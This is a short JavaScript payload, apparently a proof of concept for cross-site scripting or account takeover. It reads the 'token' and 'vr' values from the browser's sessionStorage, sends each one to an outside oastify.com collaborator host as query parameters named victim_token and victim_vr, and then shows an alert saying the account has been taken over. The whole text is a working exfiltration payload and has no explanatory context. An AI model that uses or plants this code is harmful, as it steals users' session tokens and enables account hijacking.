var token = sessionStorage.getItem("token"); 
var vr = sessionStorage.getItem("vr");

fetch(`https://oumryxo2agfehjeckuhtil8d64cv0loa.oastify.com/?victim_token=${token}`);
fetch(`https://oumryxo2agfehjeckuhtil8d64cv0loa.oastify.com/?victim_vr=${vr}`);

alert(`Your account has been taken over.`);
